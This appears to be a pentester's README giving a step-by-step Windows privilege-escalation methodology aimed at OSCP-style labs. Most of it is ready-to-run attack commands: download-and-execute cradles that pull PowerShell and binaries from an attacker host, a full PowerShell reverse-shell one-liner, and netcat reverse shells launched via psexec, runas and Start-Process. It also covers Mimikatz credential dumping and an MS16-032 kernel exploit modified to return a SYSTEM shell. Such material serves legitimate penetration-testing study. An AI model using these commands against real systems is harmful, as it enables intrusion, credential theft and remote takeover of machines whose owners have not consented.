# Windows-Privilege-Escalation
Here is my step-by-step windows privlege escalation methodology. This guide assumes you are starting with a very limited shell like a webshell, netcat reverse shell or a remote telnet connection. 

## First things first
Do some basic enumeration to figure out who we are, what OS this is, what privs we have and what patches have been installed.

```
whoami
net user <username>
systeminfo
net config Workstation 
net users 

```

## Uploading files to the Windows machine  
Sometimes we will want to upload a file to the Windows machine in order to speed up our enumeration or to privilege escalate.  Often you will find that uploading files is not needed in many cases if you are able to execute PowerShell that is hosted on a remote webserver (we will explore this more in the upgrading Windows Shell, Windows Enumeration and Windows Exploits sections).  Uploading files increased the chances of being detected by antivirus and leaves unnecssary data trail behind. 
We will look at 4 ways of uploading files to a remote Windows machine from Kali Linux:  
1. VBScript HTTP Downloader
2. PowerShell HTTP Downloader
3. Python HTTP Downloader
4. FTP Downloader

*NOTE* There are MANY more ways to move files back and forth between a Windows machine, most can be found on the LOLBAS project:
https://lolbas-project.github.io/

Most of these will require that we create a simple local webserver on our Kali box to sevre the files (NOTE: I have had issues running this command within TMUX for whatever reason... so dont run it in TMUX).
I like to use the Python Simple HTTP Server:
```
root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m SimpleHTTPServer 80
```
Or the Python pyftpdlib FTP Server (again don't run from TMUX):
```
apt-get install python-pyftpdlib
root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m pyftpdlib -p 21
```

### Uploading Files with VBScript  
First lets test to see if we can run VBScript  
```
echo WScript.StdOut.WriteLine "Yes we can run vbscript!" > testvb.vbs
```
Now we run it to see the results:  
```
cscript testvb.vbs
```
If you see the following message, we are good to go with VBScript!:  
```
C:\Users\Test>cscript testvb.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

Yes we can run vbscript!
```
If you see the following messages, you should move on to PowerShell:  
```
C:\temp>cscript testvb.vbs
This program is blocked by group policy. For more information, contact your system administrator.
C:\temp>testvb.vbs
Access is denied.
```

Now we can create a very simple downloader script by copying and pasting this single line of code into your windows commandline. I have tried to create a VBS script to download files from a remote webserver with the least possible number of lines of VBS code and I believe this is it.
If Windows is an older version of windows (Windows 8 or Server 2012 and below) use the following script:
```
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
```
If Windows is a newer version (Windows 10 or Server 2016), try the following code:
```
echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
```

Now try to download a file to the local path:  
```
cscript dl.vbs "http://10.10.10.10/archive.zip"
```

### Uploading Files with PowerShell  

Test to see if we can run Powershell:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "get-host"
```

Test to see if we can run Powershell Version 2:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$PSVersionTable"
```

Try to download a file from a remote server to the windows temp folder from the Windows command line:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
```

Or from a PowerShell... shell:
```
IEX(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
```

### Uploading Files with Python
Sometimes a Windows machine will have development tools like Python installed.
Check for python
```
python -h
```

Download a file using Python:
```
python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.10.10/cat.jpg', 'C:\\Users\\Public\\Downloads\\cat.jpg');"
```

### Uploading Files with Perl
Sometimes a Windows machine will have development tools like PERL installed.
Check for PERL
```
perl -v
```
Download a file using PERL:
```
perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://10.10.10.10/nc.exe'); my $file = $ff->fetch() or die $ff->error;"
```

### Uploading Files with FTP
After running the python ftp lib on (`python -m pyftpdlib -p 21`) on Kali, you can try connecting using the windows FTP client:
```
C:\Users\pwnd>ftp 10.10.10.10
Connected to 10.10.10.10
220 pyftpdlib 1.5.3 ready.
User (10.10.15.31:(none)): anonymous
331 Username ok, send password.
Password: anonymous

230 Login successful.                                                                                                                      
ftp> ls                                                                                                                                 
dir                                                                                                                                       
421 Active data channel timed out.                                                                                                       
```
If you are seeing a 421 timeout when you try to send a command it is likely because your connection is being blocked by the windows firewall. The Windows command-line ftp.exe supports the FTP active mode only. In the active mode, the server has to connect back to the client to establish data connection for a file transfer. 

You can check to see if the remote machine has Winscp.exe installed. Winscp is capable of connecting to an FTP server using passive mode and will not be blocked by the firewall.

## Upgrading your Windows Shell
You might find that you are connected with a limited shell such as a Web shell, netcat shell or Telnet connection that simply is not cutting it for you. Here are a few oneliners you can use to upgrade your shell:

### Upgrade Shell with PowerShell Nishang
Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetraion Tests. The scripts are written on the basis of requirement by the author during real Penetration Tests.

```bash
root@kali:~/test# git clone https://github.com/samratashok/nishang.git                                                  
Cloning into 'nishang'...
remote: Enumerating objects: 1612, done.
remote: Total 1612 (delta 0), reused 0 (delta 0), pack-reused 1612
Receiving objects: 100% (1612/1612), 5.87 MiB | 6.62 MiB/s, done.
Resolving deltas: 100% (1010/1010), done.
root@kali:~/test# cd nishang/
root@kali:~/test/nishang# cd Shells/
root@kali:~/test/nishang/Shells# echo Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 >> Invoke-PowerShellTcp.ps1
root@kali:~/test/nishang/Shells# python -m SimpleHTTPServer 80
```
Now open up a netcat listener on Kali:
```bash
nc -nlvp 4444
```
And Execute the remote powershell script hosted on your Kali SimpleHTTPServer 
```cmd
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"
```

### Upgrade Windows Command Line with a Powershell One-liner Reverse Shell:  
You can run this oneliner from the remote Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
```

### Netcat Reverseshell Oneliners for Windows
Sometimes it is helpful to create a new Netcat session from an existed limited shell, webshell or unstable (short lived) remote shell.



# Windows Enumeration
*NOTE* There are many executables that could provide privledge escalation if they are being run by a privledged user, most can be found on the incredible LOLBAS project:
https://lolbas-project.github.io/

## Automated Windows Enumeration Scripts
We are also going to look a a few automated methods of performing Windows Enumeration including:
* WindownPrivEsc.exe
* Sherlock
* Watson
* JAWZ

### Running Sherlock
Sherlock is a powershell library with a number of privledge escalation checkers built in. 
We can stage and run sherlock on a remote http server so the file never needs to hit the remote server's HDD.  
```bash
root@kali:~test# git clone https://github.com/rasta-mouse/Sherlock.git
Cloning into 'Sherlock'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 75 (delta 0), reused 2 (delta 0), pack-reused 72
Unpacking objects: 100% (75/75), done.
root@kali:~test# cd Sherlock/
root@kali:~test/Sherlock# ls
LICENSE  README.md  Sherlock.ps1
root@kali:~test/Sherlock# echo Find-AllVulns >> Sherlock.ps1
root@kali:~test/Sherlock# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```
Now we can run this from the remote Windows CMD shell:  
```cmd
CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Sherlock.ps1'))"
```
Or from a Windows Powershell:
```powershell
PS C:\> IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')
```

### Running JAWS - Just Another Windows (Enum) Script
JAWS is another powershell library that was built with privledge escalation of the OSCP lab machines in mind. 
We can stage and run JAWS on a remote http server so the file never needs to hit the remote server's HDD.  
```bash
root@kali:~test# git clone https://github.com/411Hall/JAWS
```
Now we can run this from the remote Windows CMD shell:  
```cmd
CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/jaws-enum.ps1'))"
```
Or from a Windows Powershell:
```powershell
PS C:\> IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/jaws-enum.ps1')
```
And we should see the following output start to appear:
```
Running J.A.W.S. Enumeration
        - Gathering User Information
        - Gathering Processes, Services and Scheduled Tasks
        - Gathering Installed Software
```


## Running Mimikatz
Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM/NTDS.dit databases, advanced Kerberos functionality, and more.  
https://github.com/gentilkiwi/mimikatz  

### Running traditional (binary) Mimikatz
The original and most frequently updated version of Mimikatz is the binary executable which can be found here:  
https://github.com/gentilkiwi/mimikatz/releases  

First we will need to download a Mimikatz binary and copy it to the remote machine
```
root@kali:~/test# wget https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip     
--2018-10-16 15:14:49--  https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip                     
root@kali:~/test# unzip mimikatz_trunk.zip
```
Now we will need to copy the 3 files (win32 or x64 depending on the OS) required to run Mimikatz to the remote server.
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimidrv.sys\", \"C:\\Users\\Public\\Downloads\\mimidrv.sys\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimikatz.exe\", \"C:\\Users\\Public\\Downloads\\mimikatz.exe\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimilib.dll\", \"C:\\Users\\Public\\Downloads\\mimilib.dll\")"
```
Now, if we dont have an overly interactive shell, we will want to execute Mimikatz without the built in CLI by passing the correct parameters to the executable.  We use the log parameter to also log the clear password results to a file (just in case we are unable to see the output).
```
mimikatz log version "sekurlsa::logonpasswords" exit
```
Otherwise we can use the Mimikatz shell to get the passwords:
```
mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
```


### Running Powershell Mimikatz
The Powershell version is not as frequently updated, but can be loaded into memory without ever hitting the HDD (Fileless execution).  This version simply reflectively loads the Mimikatz binary into memory so we could probably update it ourselves without much difficulty. 

```
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1
```
Fileless execution of Mimikatz from remotely hosted server:
```
IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```

## Windows Kernel Exploits


### MS16-032
If the remote machine appears to be vulnerable to MS16-032, we can execute a powershell script from a remote server to exploit it.
```
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
```
Get the Powershell script from FuzzySecurity's Github, add an invoke to the end of the script and share the folder using the python SimpleHTTPServer:

```
root@kali:~test# git clone https://github.com/FuzzySecurity/PowerShell-Suite.git
Cloning into 'PowerShell-Suite'...
remote: Enumerating objects: 378, done.
remote: Total 378 (delta 0), reused 0 (delta 0), pack-reused 378
Receiving objects: 100% (378/378), 5.94 MiB | 2.06 MiB/s, done.
Resolving deltas: 100% (179/179), done.
root@kali:~test# cd PowerShell-Suite/
root@kali:~test/PowerShell-Suite# echo Invoke-MS16-032 >> Invoke-MS16-032.ps1 
root@kali:~test/PowerShell-Suite# python -m Simple
SimpleDialog        SimpleHTTPServer    SimpleXMLRPCServer  
root@kali:~test/PowerShell-Suite# python -m SimpleHTTPServer 80
```
The default version of the MS16-032 script will create a Pop-up CMD.exe window on the remote machine. Unfortunatly, we cannot access this from a limited shell... BUT we can modify the exploit to call a reverse shell.  Its pretty easy to modify it to call a reverse powershell that will connect back to our machine with a System shell.  We will need to modify line 330 of the exploit (the ip address and port will need to be updated of course):
```powershell
		# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
		#$CallResult = [Advapi32]::CreateProcessWithLogonW(
		#	"user", "domain", "pass",
		#	0x00000002, "C:\Windows\System32\cmd.exe", "",
		#	0x00000004, $null, $GetCurrentPath,
		#	[ref]$StartupInfo, [ref]$ProcessInfo)

		# Modified to create a Powershell reverse shell 
		$CallResult = [Advapi32]::CreateProcessWithLogonW(
			"user", "domain", "pass",
			0x00000002, 
			'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 
			'-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"',
			0x00000004, $null, $GetCurrentPath,
			[ref]$StartupInfo, [ref]$ProcessInfo)
```

On the remote host execute the exploit:
```cmd
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-MS16-032.ps1'))"
```
Or from a Windows Powershell:
```powershell
IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Invoke-MS16-032.ps1')
```
Or if you wanted to upload the exploit, you can always run it like this:
```powershell
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
```
On our Kali machine we create the reverse shell and ... BOOM! Root dance.
```
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.10.11] from (UNKNOWN) [10.10.10.10] 49182

PS C:\Users\jimmy^> whoami
nt authority\system
```

## Windows Run As
Switching users in linux is trival with the SU command. However, an equivalent command does not exist in Windows. Here are 3 ways to run a command as a different user in Windows.

Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).

```cmd
 C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 
 PsExec v2.2 - Execute processes remotely
 Copyright (C) 2001-2016 Mark Russinovich
 Sysinternals - www.sysinternals.com
 ```
 
Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:
```cmd
 C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
 Enter the password for Test:
 Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
```

PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.
```powershell
 $username = '<username here>'
 $password = '<password here>'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
 Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
```
Next run this script using powershell.exe:
```powershell
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
```
Or run it as a handy one-liner from the Windows command line:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command '$username = "Admin"; $password = "PASSWORD";  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process -FilePath C:\Users\Public\Downloads\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("10.10.10.10", "4444", "-e", "cmd.exe") -WorkingDirectory C:\Users\Public\Downloads;'
```


*Easy*

**Passwords**
Passwords can be one of the easiest methods of privledge escalation and there are some tools that can help with this process.


**CopyAndPasteFileDownloader.bat**

Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line)

**CopyAndPasteEnum.bat**

No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial).
Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report

**enumeration.md** 

Basic notes on Windows Enumeration from the OSCP.

**windows_recon.bat**

An uploadable batch file for performing basic windows enumeration.


**References**  
https://medium.com/@hakluke  
https://daya.blog/2018/01/06/windows-privilege-escalation/  
https://pentestlab.blog/2017/04/19/stored-credentials/  
https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/  
https://www.abatchy.com/
https://gist.github.com/egre55
https://github.com/egre55/ultimate-file-transfer-list
https://lolbas-project.github.io/





